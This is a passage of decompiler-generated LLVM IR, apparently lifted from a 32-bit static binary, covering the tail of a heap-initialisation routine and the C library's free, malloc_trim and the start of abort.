  %v1_805f629 = or i32 %v0_805f627, 1
  store i32 %v1_805f629, i32* %eax.global-to-local, align 4
  %v0_805f62c = load i32, i32* @ecx, align 4
  %v1_805f62c = load i32, i32* %edx.global-to-local, align 4
  %v2_805f62c = add i32 %v1_805f62c, 12
  %v3_805f62c = inttoptr i32 %v2_805f62c to i32*
  store i32 %v0_805f62c, i32* %v3_805f62c, align 4
  %v0_805f62f = load i32, i32* %eax.global-to-local, align 4
  %v1_805f62f = load i32, i32* @ecx, align 4
  %v2_805f62f = add i32 %v1_805f62f, 4
  %v3_805f62f = inttoptr i32 %v2_805f62f to i32*
  store i32 %v0_805f62f, i32* %v3_805f62f, align 4
  store i32 %v1_805f568, i32* %eax.global-to-local, align 4
  %v0_805f636 = load i32, i32* %edx.global-to-local, align 4
  %v1_805f636 = load i32, i32* @ecx, align 4
  %v2_805f636 = add i32 %v1_805f636, 8
  %v3_805f636 = inttoptr i32 %v2_805f636 to i32*
  store i32 %v0_805f636, i32* %v3_805f636, align 4
  %v0_805f639 = load i32, i32* %eax.global-to-local, align 4
  %v1_805f639 = load i32, i32* @ecx, align 4
  %v2_805f639 = add i32 %v1_805f639, 12
  %v3_805f639 = inttoptr i32 %v2_805f639 to i32*
  store i32 %v0_805f639, i32* %v3_805f639, align 4
  %v0_805f63c = load i32, i32* @edi, align 4
  %v1_805f63c = load i32, i32* @ecx, align 4
  %v3_805f63c = add i32 %v1_805f63c, %v0_805f63c
  %v4_805f63c = inttoptr i32 %v3_805f63c to i32*
  store i32 %v0_805f63c, i32* %v4_805f63c, align 4
  br label %dec_label_pc_805f651

dec_label_pc_805f641:                             ; preds = %dec_label_pc_805f5e0
  %v0_805f641 = load i32, i32* @edi, align 4
  %v2_805f641 = add i32 %v0_805f641, %v1_805f5e8
  %v1_805f644 = or i32 %v2_805f641, 1
  store i32 %v1_805f644, i32* %eax.global-to-local, align 4
  %v1_805f647 = load i32, i32* @ecx, align 4
  %v2_805f647 = add i32 %v1_805f647, 4
  %v3_805f647 = inttoptr i32 %v2_805f647 to i32*
  store i32 %v1_805f644, i32* %v3_805f647, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v0_805f64e = load i32, i32* @ecx, align 4
  store i32 %v0_805f64e, i32* %v3_805f64e, align 4
  br label %dec_label_pc_805f651

dec_label_pc_805f651:                             ; preds = %dec_label_pc_805f61d, %dec_label_pc_805f641
  store i32 %v3_805f5a3, i32* @ecx, align 4
  %v1_805f655 = icmp eq i32 %v3_805f5a3, 0
  %v1_805f657 = icmp eq i1 %v1_805f655, false
  br i1 %v1_805f657, label %dec_label_pc_805f5a3, label %dec_label_pc_805f65d

dec_label_pc_805f65d:                             ; preds = %dec_label_pc_805f651, %dec_label_pc_805f58f
  store i32 %v4_805f587, i32* @ecx, align 4
  %v15_805f661 = icmp eq i32 %v0_805f59d, %v4_805f587
  br i1 %v15_805f661, label %dec_label_pc_805f6e5, label %dec_label_pc_805f667

dec_label_pc_805f667:                             ; preds = %dec_label_pc_805f65d
  br label %dec_label_pc_805f58f

dec_label_pc_805f671:                             ; preds = %dec_label_pc_805f680.preheader, %dec_label_pc_805f671
  %v1_805f67520 = phi i32 [ 1, %dec_label_pc_805f680.preheader ], [ %v0_805f680.pre, %dec_label_pc_805f671 ]
  %v2_805f675 = mul i32 %v1_805f67520, 8
  %v4_805f675 = add i32 %v3_805f675, %v2_805f675
  store i32 %v4_805f675, i32* %eax.global-to-local, align 4
  %v1_805f679 = add i32 %v1_805f67520, 1
  store i32 %v1_805f679, i32* %edx.global-to-local, align 4
  %v2_805f67a = add i32 %v4_805f675, 12
  %v3_805f67a = inttoptr i32 %v2_805f67a to i32*
  store i32 %v4_805f675, i32* %v3_805f67a, align 4
  %v0_805f67d = load i32, i32* %eax.global-to-local, align 4
  %v2_805f67d = add i32 %v0_805f67d, 8
  %v3_805f67d = inttoptr i32 %v2_805f67d to i32*
  store i32 %v0_805f67d, i32* %v3_805f67d, align 4
  %v0_805f680.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_805f683 = icmp sgt i32 %v0_805f680.pre, 95
  br i1 %v7_805f683, label %dec_label_pc_805f685, label %dec_label_pc_805f671

dec_label_pc_805f685:                             ; preds = %dec_label_pc_805f671
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805f689 = add i32 %tmp11, 864
  %v2_805f689 = inttoptr i32 %v1_805f689 to i32*
  %v3_805f689 = load i32, i32* %v2_805f689, align 4
  %v4_805f689 = or i32 %v3_805f689, 1
  store i32 %v4_805f689, i32* %v2_805f689, align 4
  %v0_805f690 = load i32, i32* %eax.global-to-local, align 4
  %v1_805f690 = add i32 %v0_805f690, 840
  %v2_805f690 = inttoptr i32 %v1_805f690 to i32*
  store i32 0, i32* %v2_805f690, align 4
  %v0_805f69a = load i32, i32* %eax.global-to-local, align 4
  %v1_805f69a = add i32 %v0_805f69a, 852
  %v2_805f69a = inttoptr i32 %v1_805f69a to i32*
  store i32 65536, i32* %v2_805f69a, align 4
  %v0_805f6a4 = load i32, i32* %eax.global-to-local, align 4
  %v1_805f6a4 = add i32 %v0_805f6a4, 844
  %v2_805f6a4 = inttoptr i32 %v1_805f6a4 to i32*
  store i32 262144, i32* %v2_805f6a4, align 4
  %v0_805f6ae = load i32, i32* %eax.global-to-local, align 4
  %v1_805f6ae = add i32 %v0_805f6ae, 836
  %v2_805f6ae = inttoptr i32 %v1_805f6ae to i32*
  store i32 262144, i32* %v2_805f6ae, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_805f6bf = load i32, i32* %arg1, align 4
  %v1_805f6c1 = urem i32 %v2_805f6bf, 4
  %v1_805f6c4 = or i32 %v1_805f6c1, 72
  store i32 %v1_805f6c4, i32* %arg1, align 4
  %v1_805f6cb = add i32 %tmp11, 52
  store i32 %v1_805f6cb, i32* %eax.global-to-local, align 4
  %v2_805f6ce = add i32 %tmp11, 44
  %v3_805f6ce = inttoptr i32 %v2_805f6ce to i32*
  store i32 %v1_805f6cb, i32* %v3_805f6ce, align 4
  %v1_805f6d3 = call i32 @sysconf(i32 30)
  store i32 %v1_805f6d3, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_805f6df = add i32 %tmp11, 860
  %v3_805f6df = inttoptr i32 %v2_805f6df to i32*
  store i32 %v1_805f6d3, i32* %v3_805f6df, align 4
  br label %dec_label_pc_805f6e5

dec_label_pc_805f6e5:                             ; preds = %dec_label_pc_805f65d, %dec_label_pc_805f685
  store i32 %v0_805f548, i32* @ebx, align 4
  store i32 %v0_805f547, i32* @esi, align 4
  store i32 %v0_805f546, i32* @edi, align 4
  store i32 %v0_805f545, i32* @ebp, align 4
  %v0_805f6ec = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805f6ec

; uselistorder directives
  uselistorder i32 %v0_805f67d, { 1, 0 }
  uselistorder i32 %v0_805f63c, { 1, 0 }
  uselistorder i32 %v1_805f5f7, { 1, 0 }
  uselistorder i32 %v2_805f5f0, { 1, 0 }
  uselistorder i32 %v1_805f5e8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805f5f4, { 1, 0 }
  uselistorder i32 %v3_805f5a3, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805f5c0, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805f59d, { 2, 0, 1, 3 }
  uselistorder i32* %v3_805f64e, { 1, 0 }
  uselistorder i32 %v1_805f568, { 1, 0 }
  uselistorder i32 %tmp11, { 6, 16, 2, 1, 15, 13, 12, 10, 9, 0, 4, 11, 5, 8, 3, 14, 7 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_805f6e5, { 1, 0 }
  uselistorder label %dec_label_pc_805f671, { 1, 0 }
  uselistorder label %dec_label_pc_805f651, { 1, 0 }
  uselistorder label %dec_label_pc_805f61d, { 1, 0 }
  uselistorder label %dec_label_pc_805f615, { 1, 0 }
  uselistorder label %dec_label_pc_805f5e0, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805f6ed = load i32, i32* @ebp, align 4
  %v0_805f6ee = load i32, i32* @edi, align 4
  %v0_805f6ef = load i32, i32* @esi, align 4
  %v0_805f6f0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805f6f8 = icmp eq i32 %arg1, 0
  br i1 %v1_805f6f8, label %dec_label_pc_805f881, label %dec_label_pc_805f700

dec_label_pc_805f700:                             ; preds = %entry
  %v2_805f70b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805f70b, i32* %eax.global-to-local, align 4
  %v4_805f710 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_8073eb0.683 to i32))
  store i32 %v4_805f710, i32* %eax.global-to-local, align 4
  %v1_805f71c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073eb0.683 to i32))
  %v1_805f721 = add i32 %arg1, -8
  store i32 %v1_805f721, i32* @ecx, align 4
  %v0_805f724 = load i8, i8* @global_var_807e120.767, align 1
  %v1_805f724 = sext i8 %v0_805f724 to i32
  store i32 %v1_805f724, i32* %eax.global-to-local, align 4
  %v1_805f72c = add i32 %arg1, -4
  %v2_805f72c = inttoptr i32 %v1_805f72c to i32*
  %v3_805f72c = load i32, i32* %v2_805f72c, align 4
  store i32 %v3_805f72c, i32* %edx.global-to-local, align 4
  %v1_805f731 = and i32 %v3_805f72c, -4
  %v4_805f731 = trunc i32 %v1_805f731 to i8
  store i32 %v1_805f731, i32* @ebx, align 4
  %v8_805f736 = icmp ugt i8 %v4_805f731, %v0_805f724
  br i1 %v8_805f736, label %dec_label_pc_805f758, label %dec_label_pc_805f738

dec_label_pc_805f738:                             ; preds = %dec_label_pc_805f700
  %v2_805f738 = udiv i32 %v3_805f72c, 8
  store i32 %v2_805f738, i32* @ebx, align 4
  %v1_805f73b = or i32 %v1_805f724, 3
  %v3_805f73b = trunc i32 %v1_805f73b to i8
  store i32 %v1_805f73b, i32* %eax.global-to-local, align 4
  store i8 %v3_805f73b, i8* @global_var_807e120.767, align 32
  %v1_805f743 = mul nuw i32 %v2_805f738, 4
  %v2_805f743 = add i32 %v1_805f743, ptrtoint (i8* @global_var_807e120.767 to i32)
  store i32 %v2_805f743, i32* %edx.global-to-local, align 4
  %v1_805f74a = add i32 %v1_805f743, add (i32 ptrtoint (i8* @global_var_807e120.767 to i32), i32 -4)
  %v2_805f74a = inttoptr i32 %v1_805f74a to i32*
  %v3_805f74a = load i32, i32* %v2_805f74a, align 4
  store i32 %v3_805f74a, i32* %eax.global-to-local, align 4
  %v3_805f74d = inttoptr i32 %arg1 to i32*
  store i32 %v3_805f74a, i32* %v3_805f74d, align 4
  %v0_805f750 = load i32, i32* @ecx, align 4
  %v1_805f750 = load i32, i32* %edx.global-to-local, align 4
  %v2_805f750 = add i32 %v1_805f750, -4
  %v3_805f750 = inttoptr i32 %v2_805f750 to i32*
  store i32 %v0_805f750, i32* %v3_805f750, align 4
  br label %dec_label_pc_805f870

dec_label_pc_805f758:                             ; preds = %dec_label_pc_805f700
  %v1_805f758 = trunc i32 %v3_805f72c to i8
  %v2_805f758 = and i8 %v1_805f758, 2
  %v3_805f758 = icmp eq i8 %v2_805f758, 0
  %v5_805f758 = zext i8 %v2_805f758 to i32
  %v7_805f758 = and i32 %v3_805f72c, -256
  %v8_805f758 = or i32 %v5_805f758, %v7_805f758
  store i32 %v8_805f758, i32* %edx.global-to-local, align 4
  %v1_805f75b = icmp eq i1 %v3_805f758, false
  br i1 %v1_805f75b, label %dec_label_pc_805f850, label %dec_label_pc_805f761

dec_label_pc_805f761:                             ; preds = %dec_label_pc_805f758
  %v1_805f761 = or i32 %v1_805f724, 1
  %v3_805f761 = trunc i32 %v1_805f761 to i8
  store i32 %v1_805f761, i32* %eax.global-to-local, align 4
  %v2_805f764 = add i32 %v1_805f731, %v1_805f721
  store i32 %v2_805f764, i32* @esi, align 4
  store i8 %v3_805f761, i8* @global_var_807e120.767, align 32
  %v1_805f76c = add i32 %v2_805f764, 4
  %v2_805f76c = inttoptr i32 %v1_805f76c to i32*
  %v3_805f76c = load i32, i32* %v2_805f76c, align 4
  store i32 %v3_805f76c, i32* %eax.global-to-local, align 4
  %v2_805f773 = inttoptr i32 %v1_805f72c to i8*
  %v3_805f773 = load i8, i8* %v2_805f773, align 1
  %v4_805f773 = urem i8 %v3_805f773, 2
  %v5_805f773 = icmp eq i8 %v4_805f773, 0
  %v1_805f777 = icmp eq i1 %v5_805f773, false
  br i1 %v1_805f777, label %dec_label_pc_805f79a, label %dec_label_pc_805f779

dec_label_pc_805f779:                             ; preds = %dec_label_pc_805f761
  %v2_805f779 = inttoptr i32 %v1_805f721 to i32*
  %v3_805f779 = load i32, i32* %v2_805f779, align 4
  store i32 %v3_805f779, i32* @ebp, align 4
  %v2_805f77e = sub i32 %v1_805f721, %v3_805f779
  store i32 %v2_805f77e, i32* %eax.global-to-local, align 4
  %v1_805f780 = add i32 %v2_805f77e, 8
  %v2_805f780 = inttoptr i32 %v1_805f780 to i32*
  %v3_805f780 = load i32, i32* %v2_805f780, align 4
  store i32 %v3_805f780, i32* @edi, align 4
  %v1_805f783 = add i32 %v2_805f77e, 12
  %v2_805f783 = inttoptr i32 %v1_805f783 to i32*
  %v3_805f783 = load i32, i32* %v2_805f783, align 4
  store i32 %v3_805f783, i32* %edx.global-to-local, align 4
  %v1_805f786 = add i32 %v3_805f780, 12
  %v2_805f786 = inttoptr i32 %v1_805f786 to i32*
  %v3_805f786 = load i32, i32* %v2_805f786, align 4
  store i32 %v3_805f786, i32* @ecx, align 4
  %v12_805f789 = icmp eq i32 %v3_805f786, %v2_805f77e
  %v1_805f78b = icmp eq i1 %v12_805f789, false
  br i1 %v1_805f78b, label %dec_label_pc_805f7c9, label %dec_label_pc_805f78d

dec_label_pc_805f78d:                             ; preds = %dec_label_pc_805f779
  %v1_805f78d = add i32 %v3_805f783, 8
  %v2_805f78d = inttoptr i32 %v1_805f78d to i32*
  %v3_805f78d = load i32, i32* %v2_805f78d, align 4
  %v15_805f78d = icmp eq i32 %v3_805f78d, %v3_805f786
  %v1_805f790 = icmp eq i1 %v15_805f78d, false
  br i1 %v1_805f790, label %dec_label_pc_805f7c9, label %dec_label_pc_805f792

dec_label_pc_805f792:                             ; preds = %dec_label_pc_805f78d
  %v2_805f792 = add i32 %v3_805f779, %v1_805f731
  store i32 %v2_805f792, i32* @ebx, align 4
  store i32 %v3_805f783, i32* %v2_805f786, align 4
  %v0_805f797 = load i32, i32* @edi, align 4
  %v1_805f797 = load i32, i32* %edx.global-to-local, align 4
  %v2_805f797 = add i32 %v1_805f797, 8
  %v3_805f797 = inttoptr i32 %v2_805f797 to i32*
  store i32 %v0_805f797, i32* %v3_805f797, align 4
  %v0_805f7a1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805f79a

dec_label_pc_805f79a:                             ; preds = %dec_label_pc_805f761, %dec_label_pc_805f792
  %v1_805f7ad = phi i32 [ %v2_805f764, %dec_label_pc_805f761 ], [ %v0_805f7a1.pre, %dec_label_pc_805f792 ]
  %v1_805f79e = and i32 %v3_805f76c, -4
  store i32 %v1_805f79e, i32* @ebp, align 4
  %v1_805f7a1 = load i32, i32* @global_var_807e14c.768, align 4
  %v12_805f7a1 = icmp eq i32 %v1_805f7ad, %v1_805f7a1
  br i1 %v12_805f7a1, label %dec_label_pc_805f7fb, label %dec_label_pc_805f7a9

dec_label_pc_805f7a9:                             ; preds = %dec_label_pc_805f79a
  %v2_805f7a9 = add i32 %v1_805f7ad, 4
  %v3_805f7a9 = add i32 %v2_805f7a9, %v1_805f79e
  %v4_805f7a9 = inttoptr i32 %v3_805f7a9 to i32*
  %v5_805f7a9 = load i32, i32* %v4_805f7a9, align 4
  store i32 %v5_805f7a9, i32* %eax.global-to-local, align 4
  %v3_805f7ad = inttoptr i32 %v2_805f7a9 to i32*
  store i32 %v1_805f79e, i32* %v3_805f7ad, align 4
  %v0_805f7b0 = load i32, i32* %eax.global-to-local, align 4
  %v1_805f7b0 = urem i32 %v0_805f7b0, 2
  %v2_805f7b0 = icmp eq i32 %v1_805f7b0, 0
  store i32 %v1_805f7b0, i32* %eax.global-to-local, align 4
  %v1_805f7b5 = icmp eq i1 %v2_805f7b0, false
  br i1 %v1_805f7b5, label %dec_label_pc_805f7d6, label %dec_label_pc_805f7b7

dec_label_pc_805f7b7:                             ; preds = %dec_label_pc_805f7a9
  %v0_805f7b7 = load i32, i32* @esi, align 4
  %v1_805f7b7 = add i32 %v0_805f7b7, 8
  %v2_805f7b7 = inttoptr i32 %v1_805f7b7 to i32*
  %v3_805f7b7 = load i32, i32* %v2_805f7b7, align 4
  store i32 %v3_805f7b7, i32* @edx, align 4
  %v1_805f7ba = add i32 %v0_805f7b7, 12
  %v2_805f7ba = inttoptr i32 %v1_805f7ba to i32*
  %v3_805f7ba = load i32, i32* %v2_805f7ba, align 4
  store i32 %v3_805f7ba, i32* %eax.global-to-local, align 4
  %v1_805f7bd = add i32 %v3_805f7b7, 12
  %v2_805f7bd = inttoptr i32 %v1_805f7bd to i32*
  %v3_805f7bd = load i32, i32* %v2_805f7bd, align 4
  store i32 %v3_805f7bd, i32* @edi, align 4
  %v12_805f7c0 = icmp eq i32 %v3_805f7bd, %v0_805f7b7
  %v1_805f7c2 = icmp eq i1 %v12_805f7c0, false
  br i1 %v1_805f7c2, label %dec_label_pc_805f7c9, label %dec_label_pc_805f7c4

dec_label_pc_805f7c4:                             ; preds = %dec_label_pc_805f7b7
  %v1_805f7c4 = add i32 %v3_805f7ba, 8
  %v2_805f7c4 = inttoptr i32 %v1_805f7c4 to i32*
  %v3_805f7c4 = load i32, i32* %v2_805f7c4, align 4
  %v15_805f7c4 = icmp eq i32 %v3_805f7c4, %v3_805f7bd
  br i1 %v15_805f7c4, label %dec_label_pc_805f7ce, label %dec_label_pc_805f7c9

dec_label_pc_805f7c9:                             ; preds = %dec_label_pc_805f7c4, %dec_label_pc_805f7b7, %dec_label_pc_805f78d, %dec_label_pc_805f779
  %v0_805f7c9 = call i32 @abort()
  store i32 %v0_805f7c9, i32* %eax.global-to-local, align 4
  %v1_805f7ce.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805f7ce

dec_label_pc_805f7ce:                             ; preds = %dec_label_pc_805f7c4, %dec_label_pc_805f7c9
  %v1_805f7ce = phi i32 [ %v3_805f7b7, %dec_label_pc_805f7c4 ], [ %v1_805f7ce.pre, %dec_label_pc_805f7c9 ]
  %v0_805f7ce = phi i32 [ %v3_805f7ba, %dec_label_pc_805f7c4 ], [ %v0_805f7c9, %dec_label_pc_805f7c9 ]
  %v2_805f7ce = add i32 %v1_805f7ce, 12
  %v3_805f7ce = inttoptr i32 %v2_805f7ce to i32*
  store i32 %v0_805f7ce, i32* %v3_805f7ce, align 4
  %v0_805f7d1 = load i32, i32* @edx, align 4
  %v1_805f7d1 = load i32, i32* %eax.global-to-local, align 4
  %v2_805f7d1 = add i32 %v1_805f7d1, 8
  %v3_805f7d1 = inttoptr i32 %v2_805f7d1 to i32*
  store i32 %v0_805f7d1, i32* %v3_805f7d1, align 4
  %v0_805f7d4 = load i32, i32* @ebx, align 4
  %v1_805f7d4 = load i32, i32* @ebp, align 4
  %v2_805f7d4 = add i32 %v1_805f7d4, %v0_805f7d4
  store i32 %v2_805f7d4, i32* @ebx, align 4
  br label %dec_label_pc_805f7d6

dec_label_pc_805f7d6:                             ; preds = %dec_label_pc_805f7a9, %dec_label_pc_805f7ce
  %v0_805f7d6 = load i32, i32* @global_var_807e15c.786, align 4
  store i32 %v0_805f7d6, i32* %eax.global-to-local, align 4
  %v0_805f7db = load i32, i32* @ecx, align 4
  %v1_805f7db = add i32 %v0_805f7db, 12
  %v2_805f7db = inttoptr i32 %v1_805f7db to i32*
  store i32 ptrtoint (i32* @global_var_807e154.770 to i32), i32* %v2_805f7db, align 4
  %v0_805f7e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_805f7e2 = load i32, i32* @ecx, align 4
  %v2_805f7e2 = add i32 %v1_805f7e2, 8
  %v3_805f7e2 = inttoptr i32 %v2_805f7e2 to i32*
  store i32 %v0_805f7e2, i32* %v3_805f7e2, align 4
  %v0_805f7e5 = load i32, i32* @ebx, align 4
  %v1_805f7e5 = load i32, i32* @ecx, align 4
  %v3_805f7e5 = add i32 %v1_805f7e5, %v0_805f7e5
  %v4_805f7e5 = inttoptr i32 %v3_805f7e5 to i32*
  store i32 %v0_805f7e5, i32* %v4_805f7e5, align 4
  %v0_805f7e8 = load i32, i32* @ecx, align 4
  %v1_805f7e8 = load i32, i32* %eax.global-to-local, align 4
  %v2_805f7e8 = add i32 %v1_805f7e8, 12
  %v3_805f7e8 = inttoptr i32 %v2_805f7e8 to i32*
  store i32 %v0_805f7e8, i32* %v3_805f7e8, align 4
  %v0_805f7eb = load i32, i32* @ebx, align 4
  %v1_805f7ed = or i32 %v0_805f7eb, 1
  store i32 %v1_805f7ed, i32* %eax.global-to-local, align 4
  %v0_805f7f0 = load i32, i32* @ecx, align 4
  store i32 %v0_805f7f0, i32* @global_var_807e15c.786, align 4
  %v2_805f7f6 = add i32 %v0_805f7f0, 4
  %v3_805f7f6 = inttoptr i32 %v2_805f7f6 to i32*
  store i32 %v1_805f7ed, i32* %v3_805f7f6, align 4
  br label %dec_label_pc_805f80b

dec_label_pc_805f7fb:                             ; preds = %dec_label_pc_805f79a
  %v0_805f7fb = load i32, i32* @ebx, align 4
  %v2_805f7fb = add i32 %v0_805f7fb, %v1_805f79e
  store i32 %v2_805f7fb, i32* @ebx, align 4
  %v1_805f7ff = or i32 %v2_805f7fb, 1
  store i32 %v1_805f7ff, i32* %eax.global-to-local, align 4
  %v1_805f802 = load i32, i32* @ecx, align 4
  %v2_805f802 = add i32 %v1_805f802, 4
  %v3_805f802 = inttoptr i32 %v2_805f802 to i32*
  store i32 %v1_805f7ff, i32* %v3_805f802, align 4
  %v0_805f805 = load i32, i32* @ecx, align 4
  store i32 %v0_805f805, i32* @global_var_807e14c.768, align 4
  br label %dec_label_pc_805f80b

dec_label_pc_805f80b:                             ; preds = %dec_label_pc_805f7d6, %dec_label_pc_805f7fb
  %v0_805f80b = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_805f80b, 131072
  br i1 %tmp21, label %dec_label_pc_805f870, label %dec_label_pc_805f813

dec_label_pc_805f813:                             ; preds = %dec_label_pc_805f80b
  %v0_805f813 = load i8, i8* @global_var_807e120.767, align 32
  %v1_805f813 = and i8 %v0_805f813, 2
  %v2_805f813 = icmp eq i8 %v1_805f813, 0
  br i1 %v2_805f813, label %dec_label_pc_805f82c, label %dec_label_pc_805f81c

dec_label_pc_805f81c:                             ; preds = %dec_label_pc_805f813
  %v2_805f824 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807e120.767 to i32*))
  store i32 %v2_805f824, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f82c

dec_label_pc_805f82c:                             ; preds = %dec_label_pc_805f813, %dec_label_pc_805f81c
  %v0_805f82c = load i32, i32* @global_var_807e14c.768, align 4
  store i32 %v0_805f82c, i32* %eax.global-to-local, align 4
  %v1_805f831 = add i32 %v0_805f82c, 4
  %v2_805f831 = inttoptr i32 %v1_805f831 to i32*
  %v3_805f831 = load i32, i32* %v2_805f831, align 4
  %v1_805f834 = and i32 %v3_805f831, -4
  store i32 %v1_805f834, i32* %eax.global-to-local, align 4
  %v1_805f837 = load i32, i32* @global_var_807e464.784, align 4
  %v7_805f837 = icmp ult i32 %v1_805f834, %v1_805f837
  br i1 %v7_805f837, label %dec_label_pc_805f870, label %dec_label_pc_805f83f

dec_label_pc_805f83f:                             ; preds = %dec_label_pc_805f82c
  store i32 ptrtoint (i8* @global_var_807e120.767 to i32), i32* @edx, align 4
  %v0_805f844 = load i32, i32* @global_var_807e468.782, align 8
  store i32 %v0_805f844, i32* @eax, align 4
  %v0_805f849 = call i32 @__malloc_trim()
  store i32 %v0_805f849, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f870

dec_label_pc_805f850:                             ; preds = %dec_label_pc_805f758
  %v2_805f850 = inttoptr i32 %v1_805f721 to i32*
  %v3_805f850 = load i32, i32* %v2_805f850, align 4
  store i32 %v3_805f850, i32* %edx.global-to-local, align 4
  %v0_805f853 = load i32, i32* @global_var_807e470.775, align 16
  %v1_805f853 = add i32 %v0_805f853, -1
  store i32 %v1_805f853, i32* @global_var_807e470.775, align 16
  %v2_805f859 = add i32 %v3_805f850, %v1_805f731
  store i32 %v2_805f859, i32* %eax.global-to-local, align 4
  %v2_805f85c = sub i32 %v1_805f721, %v3_805f850
  %v0_805f862 = load i32, i32* @global_var_807e484.778, align 4
  %v2_805f862 = sub i32 %v0_805f862, %v2_805f859
  store i32 %v2_805f862, i32* @global_var_807e484.778, align 4
  %v4_805f868 = call i32 @munmap(i32 %v2_805f85c, i32 %v2_805f859, i32 %v1_805f731, i32 %v1_805f731)
  store i32 %v4_805f868, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f870

dec_label_pc_805f870:                             ; preds = %dec_label_pc_805f82c, %dec_label_pc_805f80b, %dec_label_pc_805f83f, %dec_label_pc_805f738, %dec_label_pc_805f850
  store i32 %v2_805f70b, i32* %eax.global-to-local, align 4
  %v3_805f879 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_805f879, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f881

dec_label_pc_805f881:                             ; preds = %entry, %dec_label_pc_805f870
  %.0 = phi i32 [ undef, %entry ], [ %v3_805f879, %dec_label_pc_805f870 ]
  store i32 %v0_805f6f0, i32* @ebx, align 4
  store i32 %v0_805f6ef, i32* @esi, align 4
  store i32 %v0_805f6ee, i32* @edi, align 4
  store i32 %v0_805f6ed, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_805f850, { 1, 0, 2 }
  uselistorder i32 %v0_805f7e5, { 1, 0 }
  uselistorder i32 %v1_805f7b0, { 1, 0 }
  uselistorder i32 %v2_805f7a9, { 1, 0 }
  uselistorder i32 %v1_805f79e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805f7ad, { 1, 0 }
  uselistorder i32 %v2_805f738, { 1, 0 }
  uselistorder i32 %v1_805f731, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_805f72c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805f721, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 21, 22, 23, 24, 25, 26, 19, 20 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* bitcast (i8* @global_var_807e120.767 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_807e154.770 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_805f881, { 1, 0 }
  uselistorder label %dec_label_pc_805f870, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805f82c, { 1, 0 }
  uselistorder label %dec_label_pc_805f80b, { 1, 0 }
  uselistorder label %dec_label_pc_805f7d6, { 1, 0 }
  uselistorder label %dec_label_pc_805f7ce, { 1, 0 }
  uselistorder label %dec_label_pc_805f79a, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805f889 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805f896 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_807e120.767 to i8) to i32) to i32*))
  %v0_805f89b = load i32, i32* @ebx, align 4
  store i32 %v0_805f89b, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_807e120.767 to i32), i32* @edx, align 4
  store i32 %v0_805f889, i32* @ebx, align 4
  %v0_805f8a6 = call i32 @__malloc_trim()
  ret i32 %v0_805f8a6

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_807e120.767 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 3, 1, 2, 4 }
  uselistorder i8* @global_var_807e120.767, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_805f8b8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073ec8.787 to i32))
  %v12_805f8c2 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f8c7

dec_label_pc_805f8c7:                             ; preds = %dec_label_pc_805f8c7.dec_label_pc_805f8c7_crit_edge, %entry
